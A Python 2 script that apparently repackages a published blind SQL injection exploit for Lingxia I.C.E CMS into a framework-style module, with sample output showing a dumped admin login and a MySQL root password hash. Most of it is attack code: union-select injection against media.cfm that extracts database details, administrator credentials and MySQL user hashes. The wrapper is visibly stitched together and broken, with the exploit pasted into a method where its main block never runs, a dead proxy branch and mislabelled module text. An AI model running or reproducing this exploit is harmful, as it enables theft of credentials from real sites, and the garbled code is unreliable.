import time
def about():
	print '''!/usr/bin/python
ICE CMS Blind SQLi 0day.
[mr_me@pluto ice]$ python icecold.py -p localhost:8080 -t 10.3.100.25:8500 -d /ice/

| ---------------------------------------------------- |
| Lingxia I.C.E CMS Remote Blind SQL Injection Exploit |
| by mr_me - net-ninja.net --------------------------- |

(+) Exploiting target @: 10.3.100.25:8500/ice/
(+) Testing Proxy @ localhost:8080..
(+) Proxy is working!
(+) Using string icon_media_remove.gif for the true page
(+) This will take time, go grab a coffee..

(!) Getting database version: 5.5.9
(!) Getting database user: root@localhost
(!) Getting database name: ice
(!) Getting ICE administrative account: admin@admin.com:pa$sw0rD
(!) w00t! You have access to MySQL database!
(+) Dumping hashs hold onto your knickers..
(+) The username and hashed password is: root:*EE4E2773D7530819563F0DC6FCE27446A51C9413
(+) PoC finished.

Note to Lingexa:
Next time, acknowledge a kind email.
all possible decimal values of printable ascii characters
8 requests per char, much much cleaner.
global truStr
modified version of rsaurons function 
thanks bro. 
it will never go through all 100 iterations
	'''


def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (CMSRemoteBind)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("CMSRemoteBind","Normal","D Remote Binding Exploit (RS)")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print
	print "Publisher Information for CMSRemoteBind"
	print
	print "	   Name:","CMSRemoteBind"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class CMSRemoteBind(object):
	def start(self):
		#!/usr/bin/python
		# ICE CMS Blind SQLi 0day.
		# [mr_me@pluto ice]$ python icecold.py -p localhost:8080 -t 10.3.100.25:8500 -d /ice/
		# 
		# 	| ---------------------------------------------------- |
		# 	| Lingxia I.C.E CMS Remote Blind SQL Injection Exploit |
		# 	| by mr_me - net-ninja.net --------------------------- |
		#
		# (+) Exploiting target @: 10.3.100.25:8500/ice/
		# (+) Testing Proxy @ localhost:8080..
		# (+) Proxy is working!
		# (+) Using string 'icon_media_remove.gif' for the true page
		# (+) This will take time, go grab a coffee..
		#
		# (!) Getting database version: 5.5.9
		# (!) Getting database user: root@localhost
		# (!) Getting database name: ice
		# (!) Getting ICE administrative account: admin@admin.com:pa$sw0rD
		# (!) w00t! You have access to MySQL database!
		# (+) Dumping hashs hold onto your knickers..
		# (+) The username and hashed password is: root:*EE4E2773D7530819563F0DC6FCE27446A51C9413
		# (+) PoC finished.
		#
		# Note to Lingexa:
		# Next time, acknowledge a kind email.
		
		import sys, urllib, re
		from optparse import OptionParser
		
		# all possible decimal values of printable ascii characters
		# 8 requests per char, much much cleaner.
		lower_value = 0
		upper_value = 126
		#global truStr
		trueStr = "icon_media_remove.gif"
		
		vuluri = "media.cfm?session.current_site_id=1&session.user_id=99"
		basicInfo = {'version':'version()', 'user':'user()', 'name':'database()'}
		
		usage = "./%prog [<options>] -t [target] -d [directory]"
		usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.2.15:8500 -d /amoeba/"
		
		proxy = False
		target = raw_input("Target (host:port): ")
		directory = raw_input("Directory: ")
		
		def banner():
			print "-"*36
			print "\t| Lingxia I.C.E CMS Remote Blind SQL Injection Exploit"
			print "\t| by mr_me - net-ninja.net"
			print "-"*36,"\n\n"
		
		banner()
		
		def setTargetHTTP():
			if target[0:7] != 'http://':
				target = "http://" + target
			return target
			
		def getProxy():
			try:
				proxy = {'http': "http://"+""}
				opener = urllib.FancyURLopener(proxy)
			except(socket.timeout):
				print "\n(-) Proxy Timed Out"
				sys.exit(1)
			except(),msg:
				print "\n(-) Proxy Failed"
				sys.exit(1)
			return opener
			
		def getServerResponse(exploit):
			if False:
				try:
					target = setTargetHTTP()
					opener = getProxy()
					check = opener.open(target+directory+exploit).read()
				except urllib.error.HTTPError, error:
					check = error.read()
				except socket.error:
					print "(-) Proxy connection failed"
					sys.exit(1)
			else:
				try:
					check = urllib.urlopen(target+directory+exploit).read()
				except urllib.error.HTTPError, error:
					check = error.read()
				except urllib.error.URLError:
					print "(-) Target connection failed, check your address"
					sys.exit(1)
			return check
		
		# modified version of rsauron's function 
		# thanks bro. 
		def getAsciiValue(URI):
			lower = lower_value
			upper = upper_value
			while lower < upper:
				try:
					mid = (lower + upper) / 2
					head_URI = URI + ">"+str(mid)+"+--"
					result = getServerResponse(head_URI)
					match = re.findall(trueStr,result)
					if len(match) >= 1:
							lower = mid + 1
					else:
									 	upper = mid
				except (KeyboardInterrupt, SystemExit):
					raise
		
			if lower > lower_value and lower < upper_value:
						value = lower
			else:
					 	head_URI = URI + "="+str(lower)
						result = getServerResponse(head_URI)
						match = re.findall(trueStr,result)
						if len(match) >= 1:
								value = lower
						else:
								print "(-) READ xprog's blind sql tutorial!\n"
								sys.exit(1)
			return value
		
		def doBlindSqlInjection():
			print "(+) Using string '%s' for the true page" % (trueStr)
			print "(+) This will take time, go grab a coffee.."
			for key in basicInfo:
					sys.stdout.write("\n(!) Getting database %s: " % (key))
					sys.stdout.flush()
		
						# it will never go through all 100 iterations
					for i in range(1,100):
								request = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+ascii(substring(%s,%s,1))" % (basicInfo[key],str(i)))
								asciival = getAsciiValue(request)
								if asciival != 0:
										sys.stdout.write("%s" % (chr(asciival)))
										sys.stdout.flush()
								else:
									 	break
			
			sys.stdout.write("\n(!) Getting ICE administrative account: ")
			sys.stdout.flush()
			for i in range(1,100):
				getUserAndPass = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+ascii(substring((SELECT+concat"
				"(email,0x3a,pword)+from+ice.ice_user+limit+0,1),%s,1))" % str(i))
		
				asciival = getAsciiValue(getUserAndPass)
				
				if asciival != 0:
					sys.stdout.write("%s" % (chr(asciival)))
					sys.stdout.flush()
				else:
					pass
				
			isMysqlUser = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+(select 1 from mysql.user limit 0,1)=1")
			result = getServerResponse(isMysqlUser)
			match = re.findall(trueStr,result)
			if len(match) >= 1:
						print "\n(!) w00t! You have access to MySQL database!"
						print "(+) Dumping hashs hold onto your knickers.."
						sys.stdout.write("(+) The username and hashed password is: ")
						sys.stdout.flush()
						for k in range(1,100):
							   	getMysqlUserAndPass = (vuluri+"+union+select+1,2,3,4,5,6+from+ice_user+where+ascii(substring((SELECT+concat"
					"(user,0x3a,password)+from+mysql.user+limit+0,1),%s,1))" % str(k))
								asciival = getAsciiValue(getMysqlUserAndPass)
								if asciival != 0:
										sys.stdout.write("%s" % (chr(asciival)))
									   	sys.stdout.flush()
								else:
										break
			else:
						print "\n(-) You do not have access to MySQL database"
		
		if __name__ == "__main__":
			banner()
			print "(+) Exploiting target @: %s" % (target+directory)
			if proxy:
				print "(+) Testing Proxy @ %s.." % (proxy)
				opener = getProxy()
				try:
					check = opener.open("http://www.google.com").read()
				except:
					check = 0
					pass
				if check >= 1:
					print "(+) Proxy is working!"
				
				else:
					print "(-) Proxy failed, exiting.."
					sys.exit(1)
		
			doBlindSqlInjection()	
			print "\n(+) PoC finished."

def show_opt():
	print
	print "Module Options (CMSRemoteBind)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	print "Raw Input Arguments"
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			program = CMSRemoteBind()
			program.start()
		except Exception as e:
			print e
			print "\n[-] Failed\n"
			time.sleep(0.3)
			show_opt()
except:
	pass
